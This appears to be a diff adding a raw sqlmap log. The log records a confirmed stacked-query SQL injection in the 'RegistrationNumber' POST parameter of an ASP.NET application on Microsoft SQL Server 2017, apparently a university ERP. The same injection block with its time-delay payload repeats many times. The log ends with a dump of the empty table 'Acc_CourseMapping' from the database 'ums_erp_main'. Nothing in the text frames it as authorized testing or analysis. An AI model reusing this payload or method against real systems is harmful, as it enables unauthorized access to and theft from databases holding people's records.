@@ -1,0 +1,128 @@
+sqlmap identified the following injection point(s) with a total of 166 HTTP(s) requests:
+---
+Parameter: RegistrationNumber (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: __RequestVerificationToken=5Gn6QCAK-aFUfkaG3OJgQhL_vw5JIdEX_J74Etvdg4PMyAj8GafTN7JlE-R1yYI23S2unDR4-v72C6cisi67ZqaN1Dr_Mh5GpXTRgVX7pTw1&returnUrl=&RegistrationNumber=1964406666';WAITFOR DELAY '0:0:5'--
+---
+web server operating system: Windows
+web application technology: ASP.NET 4.0.30319, ASP.NET
+back-end DBMS: Microsoft SQL Server 2017
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: RegistrationNumber (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: __RequestVerificationToken=5Gn6QCAK-aFUfkaG3OJgQhL_vw5JIdEX_J74Etvdg4PMyAj8GafTN7JlE-R1yYI23S2unDR4-v72C6cisi67ZqaN1Dr_Mh5GpXTRgVX7pTw1&returnUrl=&RegistrationNumber=1964406666';WAITFOR DELAY '0:0:5'--
+---
+web server operating system: Windows
+web application technology: ASP.NET, ASP.NET 4.0.30319
+back-end DBMS: Microsoft SQL Server 2017
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: RegistrationNumber (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: __RequestVerificationToken=5Gn6QCAK-aFUfkaG3OJgQhL_vw5JIdEX_J74Etvdg4PMyAj8GafTN7JlE-R1yYI23S2unDR4-v72C6cisi67ZqaN1Dr_Mh5GpXTRgVX7pTw1&returnUrl=&RegistrationNumber=1964406666';WAITFOR DELAY '0:0:5'--
+---
+web server operating system: Windows
+web application technology: ASP.NET 4.0.30319, ASP.NET
+back-end DBMS: Microsoft SQL Server 2017
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: RegistrationNumber (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: __RequestVerificationToken=5Gn6QCAK-aFUfkaG3OJgQhL_vw5JIdEX_J74Etvdg4PMyAj8GafTN7JlE-R1yYI23S2unDR4-v72C6cisi67ZqaN1Dr_Mh5GpXTRgVX7pTw1&returnUrl=&RegistrationNumber=1964406666';WAITFOR DELAY '0:0:5'--
+---
+web server operating system: Windows
+web application technology: ASP.NET 4.0.30319, ASP.NET
+back-end DBMS: Microsoft SQL Server 2017
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: RegistrationNumber (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: __RequestVerificationToken=5Gn6QCAK-aFUfkaG3OJgQhL_vw5JIdEX_J74Etvdg4PMyAj8GafTN7JlE-R1yYI23S2unDR4-v72C6cisi67ZqaN1Dr_Mh5GpXTRgVX7pTw1&returnUrl=&RegistrationNumber=1964406666';WAITFOR DELAY '0:0:5'--
+---
+web server operating system: Windows
+web application technology: ASP.NET 4.0.30319, ASP.NET
+back-end DBMS: Microsoft SQL Server 2017
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: RegistrationNumber (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: __RequestVerificationToken=5Gn6QCAK-aFUfkaG3OJgQhL_vw5JIdEX_J74Etvdg4PMyAj8GafTN7JlE-R1yYI23S2unDR4-v72C6cisi67ZqaN1Dr_Mh5GpXTRgVX7pTw1&returnUrl=&RegistrationNumber=1964406666';WAITFOR DELAY '0:0:5'--
+---
+web server operating system: Windows
+web application technology: ASP.NET, ASP.NET 4.0.30319
+back-end DBMS: Microsoft SQL Server 2017
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: RegistrationNumber (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: __RequestVerificationToken=5Gn6QCAK-aFUfkaG3OJgQhL_vw5JIdEX_J74Etvdg4PMyAj8GafTN7JlE-R1yYI23S2unDR4-v72C6cisi67ZqaN1Dr_Mh5GpXTRgVX7pTw1&returnUrl=&RegistrationNumber=1964406666';WAITFOR DELAY '0:0:5'--
+---
+web server operating system: Windows
+web application technology: ASP.NET 4.0.30319, ASP.NET
+back-end DBMS: Microsoft SQL Server 2017
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: RegistrationNumber (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: __RequestVerificationToken=5Gn6QCAK-aFUfkaG3OJgQhL_vw5JIdEX_J74Etvdg4PMyAj8GafTN7JlE-R1yYI23S2unDR4-v72C6cisi67ZqaN1Dr_Mh5GpXTRgVX7pTw1&returnUrl=&RegistrationNumber=1964406666';WAITFOR DELAY '0:0:5'--
+---
+web server operating system: Windows
+web application technology: ASP.NET 4.0.30319, ASP.NET
+back-end DBMS: Microsoft SQL Server 2017
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: RegistrationNumber (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: __RequestVerificationToken=5Gn6QCAK-aFUfkaG3OJgQhL_vw5JIdEX_J74Etvdg4PMyAj8GafTN7JlE-R1yYI23S2unDR4-v72C6cisi67ZqaN1Dr_Mh5GpXTRgVX7pTw1&returnUrl=&RegistrationNumber=1964406666';WAITFOR DELAY '0:0:5'--
+---
+web server operating system: Windows
+web application technology: ASP.NET, ASP.NET 4.0.30319
+back-end DBMS: Microsoft SQL Server 2017
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: RegistrationNumber (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: __RequestVerificationToken=5Gn6QCAK-aFUfkaG3OJgQhL_vw5JIdEX_J74Etvdg4PMyAj8GafTN7JlE-R1yYI23S2unDR4-v72C6cisi67ZqaN1Dr_Mh5GpXTRgVX7pTw1&returnUrl=&RegistrationNumber=1964406666';WAITFOR DELAY '0:0:5'--
+---
+web server operating system: Windows
+web application technology: ASP.NET 4.0.30319, ASP.NET
+back-end DBMS: Microsoft SQL Server 2017
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: RegistrationNumber (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: __RequestVerificationToken=5Gn6QCAK-aFUfkaG3OJgQhL_vw5JIdEX_J74Etvdg4PMyAj8GafTN7JlE-R1yYI23S2unDR4-v72C6cisi67ZqaN1Dr_Mh5GpXTRgVX7pTw1&returnUrl=&RegistrationNumber=1964406666';WAITFOR DELAY '0:0:5'--
+---
+web server operating system: Windows
+web application technology: ASP.NET, ASP.NET 4.0.30319
+back-end DBMS: Microsoft SQL Server 2017
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: RegistrationNumber (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: __RequestVerificationToken=5Gn6QCAK-aFUfkaG3OJgQhL_vw5JIdEX_J74Etvdg4PMyAj8GafTN7JlE-R1yYI23S2unDR4-v72C6cisi67ZqaN1Dr_Mh5GpXTRgVX7pTw1&returnUrl=&RegistrationNumber=1964406666';WAITFOR DELAY '0:0:5'--
+---
+web server operating system: Windows
+web application technology: ASP.NET 4.0.30319, ASP.NET
+back-end DBMS: Microsoft SQL Server 2017
+Database: ums_erp_main
+Table: Acc_CourseMapping
+[0 entries]
++----+------------+------------+-------------+-------------+--------------+---------------+---------------+------------------+--------------------+----------+----------+----------+--------------+---------------+------------------+------------------+--------------------+
+| Id | BusinessId | ToCourseId | ToProgramId | ToSessionId | FromCourseId | FromProgramId | FromSessionId | ToOrganizationId | FromOrganizationId | CreateBy | ModifyBy | Status   | CreationDate | VersionNumber | ModificationDate | ToCoursePriority | FromCoursePriority |
++----+------------+------------+-------------+-------------+--------------+---------------+---------------+------------------+--------------------+----------+----------+----------+--------------+---------------+------------------+------------------+--------------------+
++----+------------+------------+-------------+-------------+--------------+---------------+---------------+------------------+--------------------+----------+----------+----------+--------------+---------------+------------------+------------------+--------------------+
+
